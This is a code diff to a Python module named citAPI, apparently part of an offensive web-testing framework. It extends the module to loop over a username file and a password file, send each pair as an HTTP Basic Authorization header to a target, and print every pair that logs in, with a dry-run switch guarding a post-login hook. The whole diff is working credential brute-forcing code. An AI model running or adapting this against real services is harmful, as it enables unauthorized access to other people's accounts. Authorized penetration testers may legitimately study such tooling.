@@ -10,7 +10,7 @@ class citAPI(webModule):
         super(citAPI, self).__init__(config, display, lock)
         self.fingerprint="citAPI"
         self.response="Success"
-    def appDetect(self, config, payload):
+    def somethingCool(self, config, payload):
         print("Doing something cool...eventually...")
     def connectTest(self, config, payload):
         with session() as c:
@@ -23,20 +23,42 @@ class citAPI(webModule):
             else:
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                 # Do something now!
-                self.appDetect(config, payload)
+                if not config["dry_run"]:
+                    print("[!] Time to do something cool!")
+                    self.somethingCool(config, payload)
     def payload(self, config):
+        if config["PASS_FILE"]:
+            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+            for pass_line in pass_lines:
                 if config["UserFile"]:
-                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                        for line in lines:
-                            config["USERNAME"] = line.strip('\n')
-                            creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
-                            payload = {
-                                'Authorization': 'Basic ' + creds
-                                }
-                            self.connectTest(config, payload)
+                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                    for line in lines:
+                        config["USERNAME"] = line.strip('\n')
+                        config["PASSWORD"] = pass_line.strip('\n')
+                        creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
+                        payload = {
+                            'Authorization': 'Basic ' + creds
+                            }
+                        self.connectTest(config, payload)
                 else:
+                    config["PASSWORD"] = pass_line.strip('\n')
                     creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
                     payload = {
                         'Authorization': 'Basic ' + creds
                         }
                     self.connectTest(config, payload)
+        elif config["UserFile"]:
+            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+            for line in lines:
+                config["USERNAME"] = line.strip('\n')
+                creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
+                payload = {
+                    'Authorization': 'Basic ' + creds
+                    }
+                self.connectTest(config, payload)
+        else:
+            creds = base64.b64encode(config["USERNAME"] + ":" + config["PASSWORD"])
+            payload = {
+                'Authorization': 'Basic ' + creds
+                }
+            self.connectTest(config, payload)
